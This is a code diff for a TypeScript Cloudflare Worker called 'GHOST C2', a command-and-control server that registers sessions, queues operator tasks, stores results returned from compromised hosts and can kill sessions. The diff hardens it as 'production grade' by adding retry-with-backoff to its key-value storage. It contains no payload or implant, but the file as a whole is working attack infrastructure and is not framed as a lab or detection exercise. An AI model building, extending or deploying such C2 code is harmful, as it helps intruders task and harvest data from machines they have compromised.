@@ -1,8 +1,11 @@
 /**
  * GHOST C2 — Cloudflare Worker
  * 
- * FIXED: URL‑decodes session IDs in path parameters so CLI can use encoded IDs.
- * Results are kept by default; use ?clear=1 to remove after retrieval.
+ * PRODUCTION GRADE:
+ * - URL-decodes session IDs (fixes pipe issue).
+ * - Results kept by default; ?clear=1 removes.
+ * - Retry logic for KV operations (3 attempts with backoff).
+ * - Detailed logging for debugging.
  */
 interface Env {
   GHOST_KV: KVNamespace;
@@ -102,90 +105,128 @@ function withCORS(response: Response, env: Env): Response {
   });
 }
 
-// ─── KV Operations ────────────────────────────────────────
+// ─── KV Operations with Retry ─────────────────────────────
+
+const MAX_RETRIES = 3;
+const RETRY_DELAY_MS = 200;
+
+async function withRetry<T>(fn: () => Promise<T>): Promise<T> {
+  let lastError: Error | undefined;
+  for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
+    try {
+      return await fn();
+    } catch (err) {
+      lastError = err as Error;
+      if (attempt < MAX_RETRIES - 1) {
+        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY_MS * (attempt + 1)));
+      }
+    }
+  }
+  throw lastError || new Error("KV operation failed after retries");
+}
 
 async function getSession(kv: KVNamespace, sid: string): Promise<SessionData | null> {
-  const raw = await kv.get(`session:${sid}`);
-  return raw ? JSON.parse(raw) as SessionData : null;
+  return withRetry(async () => {
+    const raw = await kv.get(`session:${sid}`);
+    return raw ? JSON.parse(raw) as SessionData : null;
+  });
 }
 
 async function putSession(kv: KVNamespace, sid: string, data: SessionData, ttl: number): Promise<void> {
-  await kv.put(`session:${sid}`, JSON.stringify(data), { expirationTtl: ttl });
+  await withRetry(async () => {
+    await kv.put(`session:${sid}`, JSON.stringify(data), { expirationTtl: ttl });
+  });
 }
 
 async function getTasks(kv: KVNamespace, sid: string): Promise<string[]> {
-  const raw = await kv.get(`tasks:${sid}`);
-  return raw ? JSON.parse(raw) as string[] : [];
+  return withRetry(async () => {
+    const raw = await kv.get(`tasks:${sid}`);
+    return raw ? JSON.parse(raw) as string[] : [];
+  });
 }
 
 async function putTasks(kv: KVNamespace, sid: string, tasks: string[], sessionTtl = 86400): Promise<void> {
-  if (tasks.length === 0) {
-    await kv.delete(`tasks:${sid}`);
-  } else {
-    await kv.put(`tasks:${sid}`, JSON.stringify(tasks), { expirationTtl: 86400 });
-  }
-  const raw = await kv.get(`session:${sid}`);
-  if (raw) {
-    const data = JSON.parse(raw) as SessionData;
-    data.pending_tasks = tasks.length;
-    await kv.put(`session:${sid}`, JSON.stringify(data), { expirationTtl: sessionTtl });
-  }
+  await withRetry(async () => {
+    if (tasks.length === 0) {
+      await kv.delete(`tasks:${sid}`);
+    } else {
+      await kv.put(`tasks:${sid}`, JSON.stringify(tasks), { expirationTtl: 86400 });
+    }
+    // Update denormalized count
+    const raw = await kv.get(`session:${sid}`);
+    if (raw) {
+      const data = JSON.parse(raw) as SessionData;
+      data.pending_tasks = tasks.length;
+      await kv.put(`session:${sid}`, JSON.stringify(data), { expirationTtl: sessionTtl });
+    }
+  });
 }
 
 async function getResults(kv: KVNamespace, sid: string): Promise<ResultEntry[]> {
-  const raw = await kv.get(`results:${sid}`);
-  return raw ? JSON.parse(raw) as ResultEntry[] : [];
+  return withRetry(async () => {
+    const raw = await kv.get(`results:${sid}`);
+    return raw ? JSON.parse(raw) as ResultEntry[] : [];
+  });
 }
 
 async function putResults(kv: KVNamespace, sid: string, results: ResultEntry[]): Promise<void> {
-  if (results.length === 0) {
-    await kv.delete(`results:${sid}`);
-  } else {
-    await kv.put(`results:${sid}`, JSON.stringify(results), { expirationTtl: 86400 });
-  }
+  await withRetry(async () => {
+    if (results.length === 0) {
+      await kv.delete(`results:${sid}`);
+    } else {
+      await kv.put(`results:${sid}`, JSON.stringify(results), { expirationTtl: 86400 });
+    }
+  });
 }
 
 async function appendResult(kv: KVNamespace, sid: string, entry: ResultEntry): Promise<void> {
-  const results = await getResults(kv, sid);
-  const RESULT_CAP = 500;
-  const BYTE_CAP = 20 * 1024 * 1024;
-  if (results.length >= RESULT_CAP) results.shift();
-  results.push(entry);
+  await withRetry(async () => {
+    const results = await getResults(kv, sid);
+    const RESULT_CAP = 500;
+    const BYTE_CAP = 20 * 1024 * 1024;
+    if (results.length >= RESULT_CAP) results.shift();
+    results.push(entry);
 
-  const payload = JSON.stringify(results);
-  if (payload.length > BYTE_CAP) {
-    while (results.length > 1 && JSON.stringify(results).length > BYTE_CAP) {
-      results.shift();
+    const payload = JSON.stringify(results);
+    if (payload.length > BYTE_CAP) {
+      while (results.length > 1 && JSON.stringify(results).length > BYTE_CAP) {
+        results.shift();
+      }
     }
-  }
-  await putResults(kv, sid, results);
+    await putResults(kv, sid, results);
 
-  const raw = await kv.get(`session:${sid}`);
-  if (raw) {
-    const data = JSON.parse(raw) as SessionData;
-    data.result_count = results.length;
-    await kv.put(`session:${sid}`, JSON.stringify(data), { expirationTtl: 86400 });
-  }
+    // Update denormalized count
+    const raw = await kv.get(`session:${sid}`);
+    if (raw) {
+      const data = JSON.parse(raw) as SessionData;
+      data.result_count = results.length;
+      await kv.put(`session:${sid}`, JSON.stringify(data), { expirationTtl: 86400 });
+    }
+  });
 }
 
 async function listSessionKeys(kv: KVNamespace): Promise<string[]> {
-  const keys: string[] = [];
-  let cursor: string | undefined;
-  do {
-    const result = await kv.list({ prefix: "session:", cursor, limit: 1000 });
-    for (const key of result.keys) keys.push(key.name);
-    cursor = result.list_complete ? undefined : result.cursor;
-  } while (cursor);
-  return keys;
+  return withRetry(async () => {
+    const keys: string[] = [];
+    let cursor: string | undefined;
+    do {
+      const result = await kv.list({ prefix: "session:", cursor, limit: 1000 });
+      for (const key of result.keys) keys.push(key.name);
+      cursor = result.list_complete ? undefined : result.cursor;
+    } while (cursor);
+    return keys;
+  });
 }
 
 async function logAudit(kv: KVNamespace, entry: AuditEntry): Promise<void> {
-  const key = "audit_log";
-  const raw = await kv.get(key);
-  const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];
-  if (log.length >= 1000) log.splice(0, log.length - 999);
-  log.push(entry);
-  await kv.put(key, JSON.stringify(log), { expirationTtl: 604800 });
+  await withRetry(async () => {
+    const key = "audit_log";
+    const raw = await kv.get(key);
+    const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];
+    if (log.length >= 1000) log.splice(0, log.length - 999);
+    log.push(entry);
+    await kv.put(key, JSON.stringify(log), { expirationTtl: 604800 });
+  });
 }
 
 // ─── Route Handlers ───────────────────────────────────────
@@ -234,6 +275,7 @@ async function handleResult(request: Request, env: Env): Promise<Response> {
   const entry: ResultEntry = { ts: new Date().toISOString(), output };
   await appendResult(env.GHOST_KV, sid, entry);
 
+  // Ensure session exists (re‑register if purged)
   const existing = await getSession(env.GHOST_KV, sid);
   if (!existing) {
     const now = new Date().toISOString();
@@ -311,10 +353,6 @@ async function handleAddTask(request: Request, env: Env): Promise<Response> {
   return jsonResponse({ status: "queued", queue_depth: tasks.length });
 }
 
-/**
- * GET /results/:sid
- * Operator retrieves results. Keeps by default; ?clear=1 to remove.
- */
 async function handleGetResults(request: Request, env: Env, sid: string): Promise<Response> {
   // Decode URL-encoded session ID (fix for pipe character)
   sid = decodeURIComponent(sid);
@@ -343,7 +381,6 @@ async function handleGetResults(request: Request, env: Env, sid: string): Promis
 }
 
 async function handleKillSession(request: Request, env: Env, sid: string): Promise<Response> {
-  // Decode URL-encoded session ID
   sid = decodeURIComponent(sid);
 
   const session = await getSession(env.GHOST_KV, sid);
@@ -469,12 +506,11 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
     return withCORS(await handleAudit(request, env), env);
   }
 
-  // ── Parameterised routes – decode session ID from URL ──
+  // ── Parameterised routes – decode session ID ──
   const resultsMatch = path.match(/^\/results\/(.+)$/);
   if (resultsMatch && method === "GET") {
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
-    // Decode the encoded session ID before passing to handler
     const sid = decodeURIComponent(resultsMatch[1]);
     return withCORS(await handleGetResults(request, env, sid), env);
   }
